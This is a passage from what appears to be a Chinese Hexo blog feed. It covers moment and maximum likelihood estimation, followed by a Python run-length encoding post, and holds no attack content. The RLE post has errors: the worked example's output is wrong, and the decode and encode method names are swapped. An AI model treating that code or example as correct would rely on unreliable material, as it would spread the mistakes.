style="height:0.258664em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.8100000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>这样就可以求出矩估计的均值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>μ</mi><mo stretchy="true">^</mo></mover></mrow><annotation encoding="application/x-tex">\widehat{\mu}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.865em;vertical-align:-0.19444em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">μ</span></span></span><span class="svg-align" style="width:calc(100% - 0.05556em);margin-left:0.05556em;top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span>和方差<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mover accent="true"><mi>σ</mi><mo stretchy="true">^</mo></mover><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\widehat{\sigma}^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>。求得最终的表达式为：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mover accent="true"><mi>μ</mi><mo stretchy="true">^</mo></mover><mo>=</mo><mover accent="true"><mi>X</mi><mo stretchy="true">‾</mo></mover></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mover accent="true"><mi>σ</mi><mo stretchy="true">^</mo></mover><mn>2</mn></msup><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>X</mi><mo stretchy="true">‾</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}\widehat{\mu}=\overline{X} \\\\\widehat{\sigma}^2=\frac{1}{n} \sum_{i=1}^n (X_i-\overline{X})^2 \\\\ \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.76em;vertical-align:-2.63em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9500200000000003em;"><span style="top:-1.59999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.59999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-1.89999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.1500100000000004em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.30001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.90001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-5.20002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.1300000000000003em;"><span style="top:-5.130000000000001em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">μ</span></span></span><span class="svg-align" style="width:calc(100% - 0.05556em);margin-left:0.05556em;top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span></span></span><span style="top:-3.6900000000000004em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.67056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">σ</span></span></span><span class="svg-align" style="top:-3.43056em;"><span class="pstrut" style="height:3em;"></span><span style="height:0.24em;"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22c-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord overline"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8833300000000001em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span><span style="top:-3.80333em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-0.8100000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="极大似然估计"><a class="markdownIt-Anchor" href="#极大似然估计"></a> 极大似然估计</h3><ul><li>给定数据X，参数的似然函数为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(X|\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span>，也就是观测到数据X的概率</li><li>如果数据i.i.d，那么：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><msub><mo>∏</mo><mi>i</mi></msub><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mi>θ</mi><mo stretchy="false">)</mo></mrow><mo stretchy="false">(</mo><mi>i</mi><mi mathvariant="normal">.</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L(X,\theta)= {\prod_{i}P(X_i|\theta)} (i.i.d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord">.</span><span class="mord mathdefault">i</span><span class="mord">.</span><span class="mord mathdefault">d</span><span class="mclose">)</span></span></span></span></li><li>极大似然估计：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>θ</mi><mo>^</mo></mover><mo>=</mo><mi>arg</mi><mo>⁡</mo><msub><mo><mi>max</mi><mo>⁡</mo></mo><mi>θ</mi></msub><mi>L</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\hat\theta = \arg\max_\theta L(X,\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span>，带帽子的代表是估计的。</li><li>对数似然：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>log</mi><mo>⁡</mo><mrow><mi>L</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><msub><mo>∑</mo><mi>i</mi></msub><mi>log</mi><mo>⁡</mo><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mi>θ</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">\log{L(X,\theta)}=\sum_i\log{P(X_i|\theta)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></span></li><li>最大似然估计：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mi>θ</mi><mo>^</mo></mover><mo>=</mo><mi>arg</mi><mo>⁡</mo><msub><mo><mi>max</mi><mo>⁡</mo></mo><mi>θ</mi></msub><mi>P</mi><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mi>θ</mi><mo stretchy="false">)</mo><mo>→</mo><mi mathvariant="normal">∂</mi><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\hat\theta=\arg\max_\theta P(X_i|\theta)\to \partial P(X|\theta)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9578799999999998em;vertical-align:0em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9578799999999998em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span><span style="top:-3.26344em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.16666em;">^</span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span><ul><li>有偏估计</li><li>无偏估计</li></ul></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> probability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游程编码</title>
      <link href="/2020/06/25/%E7%BC%96%E7%A0%81/"/>
      <url>/2020/06/25/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>游程编码是一种在线搞笑的压缩算法</p></blockquote><a id="more"></a><h1 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h1><ul><li>游程编码的做法简单，将连续出现的字符转换成次数和该字符的组合，例如“aaaabcccaa”，编码后“4q1b3c2a”。解码也同理。</li></ul><h1 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RLE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self,str</span>):</span></span><br><span class="line">        str += <span class="string">&quot; &quot;</span></span><br><span class="line">        current = <span class="string">&quot;&quot;</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> current:</span><br><span class="line">                current = i</span><br><span class="line">                count = <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i == current:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">                    result += current</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += <span class="string">&#x27;&#123;&#125;&#123;&#125;&#x27;</span>.format(count,current)</span><br><span class="line">                current = i</span><br><span class="line">                count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">self,str</span>):</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">if</span> i.isdigit():</span><br><span class="line">                number += i</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.format(i,number))</span><br><span class="line">                result += i*int(number)</span><br><span class="line">                number = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">r = RLE()</span><br><span class="line">print(r.decode(<span class="string">&quot;aaaabcccaa&quot;</span>))</span><br><span class="line">print(r.encode(<span class="string">&quot;3e4f2e&quot;</span>))</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> funny </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数独</title>
      <link href="/2020/06/25/%E7%8B%AC/"/>
      <url>/2020/06/25/%E7%8B%AC/</url>
      
